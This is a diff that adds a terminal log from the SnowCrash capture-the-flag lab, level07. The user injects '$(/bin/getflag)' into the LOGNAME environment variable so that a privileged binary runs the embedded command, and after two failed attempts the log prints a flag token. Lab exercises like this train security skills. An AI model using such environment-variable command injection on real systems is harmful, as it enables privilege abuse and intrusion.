@@ -1,0 +1,13 @@
+level07@SnowCrash:~$ ls
+level07
+level07@SnowCrash:~$ export LOGIN='$"(/bin/getflag)"'
+level07@SnowCrash:~$ ./level07
+level07
+level07@SnowCrash:~$ export LOGNAME='$"(/bin/getflag)"'
+level07@SnowCrash:~$ ls
+level07
+level07@SnowCrash:~$ ./level07
+$(/bin/getflag)
+level07@SnowCrash:~$ export LOGNAME='"$(/bin/getflag)"'
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
